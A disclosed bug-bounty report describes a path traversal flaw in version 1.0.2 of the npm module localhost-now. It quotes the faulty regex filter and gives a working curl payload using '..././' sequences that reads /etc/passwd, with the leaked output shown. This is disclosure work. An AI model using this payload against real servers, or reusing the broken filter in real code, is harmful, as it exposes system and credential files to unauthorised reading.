# [localhost-now] bypassing url filter which leads to read content of arbitrary file

## Report Details
- **Report ID**: 334837
- **URL**: https://hackerone.com/reports/334837
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-04-09T09:23:56.500Z
- **Disclosed**: 2018-05-30T13:05:21.202Z

## Reporter
- **Username**: dienpv
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi guys,
i can bypass url filter in localhost-now module.
It allows to read content of arbitrary files on the remote server.

# Module

**module name:** localhost-now
**version:** 1.0.2
**npm page:** https://www.npmjs.com/package/localhost-now

## Module Stats

26 downloads in the last week

## Vulnerability Description

Lack of file path sanitization by using the regex method causes that any file on the server might be read by malicious user
ex: input: url = ..././etc/passwd
when the url calls replace(/(\.\.[\/\\])+/g, '') and then ../ will be removed -> final result: url = ../etc/passwd. (same in windows for ```...\.\```)
```javascript
// /localhost-now/lib/app.js, line 17:
const file = url === '/' ? '/index.html' : url.replace(/(\.\.[\/\\])+/g, '')
```
## Steps To Reproduce:
- install ```localhost-now```:
```npm install localhost-now```
- run ```localhost-now``` in your directory

```
root@kali:/var/www/html/localhost-now/bin# nodejs localhost
Web Server started on localhost:1337
```
- execute following curl command (adjust number of ../ to reflect your system):

``` curl -v --path-as-is http://127.0.0.1:1337/..././..././..././..././..././etc/passwd ```
- look at result:

```
* Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 1337 (#0)
> GET /..././..././..././..././..././etc/passwd HTTP/1.1
> Host: 127.0.0.1:1337
> User-Agent: curl/7.50.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< content-type: text/
< Date: Mon, 09 Apr 2018 09:04:13 GMT
< Connection: keep-alive
< Content-Length: 2908
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
```
thanks you

## Impact

This vulnerability might be used to read content of any file on the server

## Attachments
No attachments
